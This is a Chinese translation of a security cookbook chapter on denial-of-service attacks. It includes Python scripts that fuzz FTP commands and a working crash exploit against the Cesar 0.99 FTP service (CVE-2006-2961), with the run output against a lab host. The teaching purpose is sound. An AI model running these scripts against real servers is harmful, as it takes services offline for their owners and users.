# 第六章 拒绝服务

> 作者：Justin Hutchens

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

任何时候，当你通过互联网访问公开资源，甚至通过内部网络访问小型社区时，重要的是要考虑拒绝服务（DoS）攻击的风险。 DoS 攻击可能令人沮丧，并且可能非常昂贵。 最糟糕的是，这些威胁往往是一些最难以缓解的威胁。 为了能够正确评估对网络和信息资源的威胁，必须了解现有的 DoS 威胁的类型以及与之相关的趋势。 

在单独讨论列出的每个秘籍之前，我们应该强调一些基本原则，并了解它们如何与本章中讨论的 DoS 攻击相关。 我们将在接下来的秘籍中讨论的 DoS 攻击可以分为缓冲区溢出，流量放大攻击或资源消耗攻击。 我们将按此顺序讨论与这些类型的攻击的工作原理相关的一般原则。

缓冲区溢出是一种编程漏洞，可能导致应用程序，服务或整个底层操作系统的拒绝服务。 一般来说，缓冲区溢出能够导致拒绝服务，因为它可能导致任意数据被加载到非预期的内存段。 这可能会中断执行流程，并导致服务或操作系统崩溃。 流量放大 DoS 攻击能够通过消耗特定服务器，设备或网络可用的网络带宽来产生 DoS 条件。 流量放大攻击需要两个条件才能成功。 这些条件如下：

+   重定向：攻击者必须能够请求可以重定向到受害者的响应。 这通常通过 IP 欺骗来实现。 因为 UDP 不是面向连接的协议，所以使用 UDP 作为其相关的传输层协议的大多数应用层协议，可以用于通过伪造的请求，将服务响应重定向到其他主机。 
+   放大：重定向的响应必须大于请求该响应的请求。 响应字节大小和请求字节大小的比率越大，攻击就越成功。

例如，如果发现了生成 10 倍于相关请求的响应的 UDP 服务，则攻击者可以利用该服务来潜在地生成 10 倍的攻击流量，而不是通过将伪造的请求发送到 漏洞服务，以可能最高的速率传输。 资源消耗攻击是产生如下的条件的攻击，其中主机服务器或设备的本地资源被消耗到一定程度，使得这些资源不再能够用于执行其预期的操作功能。 这种类型的攻击可以针对各种本地资源，包括内存，处理器性能，磁盘空间或并发网络连接的可持续性。

## 6.1 使用模糊测试来识别缓冲区溢出

识别缓冲区溢出漏洞的最有效的技术之一是模糊测试。 模糊测试通过将精巧的或随机数据传递给函数，来测试与各种输入相关的结果。 在正确的情况下，输入数据可能逃离其指定的缓冲区，并流入相邻的寄存器或内存段。 此过程将中断执行流程并导致应用程序或系统崩溃。 在某些情况下，缓冲区溢出漏洞也可以用于执行未经授权的代码。 在这个秘籍中，我们会讨论如何通过开发自定义的Fuzzing工具，来测试缓冲区溢出漏洞。

### 准备

为了执行远程模糊测试，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，使用了拥有 FTP 服务的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 工作原理

Python 是一种优秀的脚本语言，可用于高效开发自定义的模糊测试工具。 当评估 TCP 服务时，套接字函数可用于简化执行完全三次握手序列，和连接到监听服务端口的过程。 任何模糊脚本的主要目的是，将数据作为输入发送到任何给定的函数并评估结果。 我开发了一个脚本，可以用来模糊测试 FTP 服务的验证后的功能，如下所示：

```py
#!/usr/bin/python

import socket 
import sys

if len(sys.argv) != 6:   
    print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum]"   
    print "Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000"   
    print "Example will fuzz the defined FTP service with a series of payloads"   
    print "to include 100 'A's, 200 'A's, etc... up to the maximum of 1000"   
    sys.exit()

target = str(sys.argv[1]) 
port = int(sys.argv[2]) 
char = str(sys.argv[3]) 
i = int(sys.argv[4]) 
interval = int(sys.argv[4]) 
max = int(sys.argv[5]) 
user = raw_input(str("Enter ftp username: ")) 
passwd = raw_input(str("Enter ftp password: ")) 
command = raw_input(str("Enter FTP command to fuzz: "))

while i <= max:   
    try:      
        payload = command + " " + (char * i)      
        print "Sending " + str(i) + " instances of payload (" + char + ") to target"      
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
        connect=s.connect((target,port))      
        s.recv(1024)      
        s.send('USER ' + user + '\r\n')      
        s.recv(1024)      
        s.send('PASS ' + passwd + '\r\n')
        s.recv(1024)
        s.send(payload + '\r\n')
        s.send('QUIT\r\n')
        s.recv(1024)
        s.close()
        i = i + interval
    except:
        print "\nUnable to send...Server may have crashed"
        sys.exit()

print "\nThere is no indication that the server has crashed" 
```

脚本的第一部分定义了 Python 解释器的位置，并导入所需的库。 第二部分检查提供的参数数量，以确保其与脚本的适当用法一致。 脚本的第三部分定义将在整个脚本执行期间使用的变量。 其中几个变量从系统参数中接收到它们的值，这些参数在执行时传递给脚本。 剩余的变量通过接受脚本的用户的输入来定义。 最后，脚本的其余部分定义了模糊测试过程。 我们执行`ftp_fuzz.py`文件，如下：

```
root@KaliLinux:~# ./ftp_fuzz.py 
Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Payload] [Interval] [Maximum] 
Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000 
Example will fuzz the defined FTP service with a series of payloads to include 100 'A's, 200 'A's, etc... up to the maximum of 1000 
root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 A 100 1000 
Enter ftp username: anonymous 
Enter ftp password: user@mail.com 
Enter FTP command to fuzz: MKD

Sending 100 instances of payload (A) to target 
Sending 200 instances of payload (A) to target 
Sending 300 instances of payload (A) to target 
Sending 400 instances of payload (A) to target 
Sending 500 instances of payload (A) to target 
Sending 600 instances of payload (A) to target 
Sending 700 instances of payload (A) to target 
Sending 800 instances of payload (A) to target 
Sending 900 instances of payload (A) to target 
Sending 1000 instances of payload (A) to target

There is no indication that the server has crashed
```

如果脚本在没有适当数量的系统参数的情况下执行，脚本将返回预期的用法。有几个值必须作为系统参数来包含。要传递给脚本的第一个参数是目标 IP 地址。此 IP 地址是与运行所需模糊测试的 FTP 服务的系统相关的 IP 地址。下一个参数是运行 FTP 服务的端口号。在大多数情况下，FTP 在 TCP 端口 21 中运行。载荷定义了要批量传递到服务的字符或字符序列。 `interval`参数定义了在一次迭代中传递给 FTP 服务的载荷实例数。参数也是这样的数量，通过该数量，载荷实例的数量将随着每次连续迭代增加到最大值。此最大值由最后一个参数的值定义。在使用这些系统参数执行脚本后，它将请求 FTP 服务的身份验证凭证，并询问应该对哪个身份验证后的功能进行模糊测试。在提供的示例中，模糊测试对 IP 地址`172.16.36.134`的 Windows XP 主机的 TCP 端口 21 上运行的 FTP 服务执行。匿名登录凭据传递给了具有任意电子邮件地址的 FTP 服务。此外，一系列 As 被传递到 MKD 验证后的功能，从 100 个实例开始，并每次增加 100，直到达到最大 1000 个实例。同样的脚本也可以用来传递载荷中的一系列字符：

```
root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 ABCD 100 500 
Enter ftp username: anonymous 
Enter ftp password: user@mail.com 
Enter FTP command to fuzz: MKD 
Sending 100 instances of payload (ABCD) to target 
Sending 200 instances of payload (ABCD) to target 
Sending 300 instances of payload (ABCD) to target
Sending 400 instances of payload (ABCD) to target 
Sending 500 instances of payload (ABCD) to target

There is no indication that the server has crashed
```

在所提供的示例中，载荷被定义为`ABCD`，并且该载荷的实例被定义为 100 的倍数，直到最大值 500。

### 工作原理

一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。 此秘籍中讨论的特定脚本的工作原理是，在服务或操作系统崩溃的情况下，套接字将不再接受输入，并且脚本将无法完成整个载荷注入序列。 如果发生这种情况，脚本需要使用`Ctrl + C`强制关闭。在这种情况下，脚本会返回一个标志，表示后续的载荷无法发送，并且服务器可能已崩溃。

## 6.2 FTP 远程服务的缓冲区溢出 DoS 攻击

在正确的情况下，输入数据可能逃离其指定的缓冲区并流入相邻的寄存器或内存段。 此过程将中断执行流程并导致应用程序或系统崩溃。 在某些情况下，缓冲区溢出漏洞也可以用于执行未经授权的代码。 在这个特定的秘籍中，我们基于 Cesar 0.99 FTP 服务的缓冲区溢出，展示如何执行 DoS 攻击的示例。

### 准备

为了执行远程模糊测试，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，使用了拥有 FTP 服务的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

有一个公开披露的漏洞与 Cesar 0.99 FTP 服务相关。 此漏洞由常见漏洞和披露（CVE）编号系统定义为 CVE-2006-2961。 通过对此漏洞进行研究，显然可以通过向 MKD 函数发送换行字符的验证后序列，来触发基于栈的缓冲区溢出。 为了避免将`\ n`转义序列传递给 Python 脚本，以及之后在提供的输入中正确解释它的相关困难，我们应该修改先前秘籍中讨论的脚本。 然后，我们可以使用修改的脚本来利用此现有漏洞：

```py
#!/usr/bin/python

import socket 
import sys

if len(sys.argv) != 5:   
    print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum]"   
    print "Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000"   
    print "Example will fuzz the defined FTP service with a series of line break "   
    print "characters to include 100 '\\n's, 200 '\\n's, etc... up to the maximum of 1000"   
    sys.exit()

target = str(sys.argv[1]) 
port = int(sys.argv[2]) 
i = int(sys.argv[3]) 
interval = int(sys.argv[3]) 
max = int(sys.argv[4]) 
user = raw_input(str("Enter ftp username: ")) 
passwd = raw_input(str("Enter ftp password: ")) 
command = raw_input(str("Enter FTP command to fuzz: "))

while i <= max:   
    try:      
        payload = command + " " + ('\n' * i)      
        print "Sending " + str(i) + " line break characters to target"      
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        connect=s.connect((target,port))      
        s.recv(1024)
        s.send('USER ' + user + '\r\n')
        s.recv(1024)
        s.send('PASS ' + passwd + '\r\n')
        s.recv(1024)
        s.send(payload + '\r\n')
        s.send('QUIT\r\n')
        s.recv(1024)
        s.close()
        i = i + interval
    except:
        print "\nUnable to send...Server may have crashed"
        sys.exit()

print "\nThere is no indication that the server has crashed" 
```

对脚本所做的修改包括，修改使用描述和删除作为提供的参数的载荷，然后将换行载荷硬编码到要按顺序发送的脚本中。

```
root@KaliLinux:~# ./ftp_fuzz.py 
Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum] 
Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000 
Example will fuzz the defined FTP service with a series of line break characters to include 100 '\n's, 200 '\n's, etc... up to the maximum of 1000 
root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 100 1000 
Enter ftp username: anonymous 
Enter ftp password: user@mail.com 
Enter FTP command to fuzz: MKD 
Sending 100 line break characters to target 
Sending 200 line break characters to target 
Sending 300 line break characters to target 
Sending 400 line break characters to target 
Sending 500 line break characters to target 
Sending 600 line break characters to target 
Sending 700 line break characters to target 
^C 
Unable to send...Server may have crashed
```

如果脚本在没有适当数量的系统参数的情况下执行，脚本将返回预期的用法。 然后，我们可以执行脚本并发送一系列载荷，它们的数量为 100 的倍数，最大为 1000。在发送 700 个换行符的载荷后，脚本停止发送载荷，并处于空闲状态。 在一段时间不活动后，脚本使用`Ctrl + C`被强制关闭。脚本表示它已经无法发送字符，并且远程服务器可能已经崩溃。 看看下面的截图：

![](img/6-2-1.jpg)

通过返回到运行 Cesar 0.99 FTP 服务的 Windows XP 主机，我们可以看到`server.exe`应用程序崩溃了。 要在拒绝服务后恢复操作，必须手动重新启动 Cesar FTP 服务。

### 工作原理

一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。 此秘籍中讨论的特定脚本的工作原理是，在服务或操作系统崩溃的情况下，套接字将不再接受输入，并且脚本将无法完成整个有效载荷注入序列。 如果发生这种情况，脚本需要使用`Ctrl + C`强制关闭。在这种情况下，脚本将返回一个标识，表明后续载荷无法发送，并且服务器可能已崩溃。
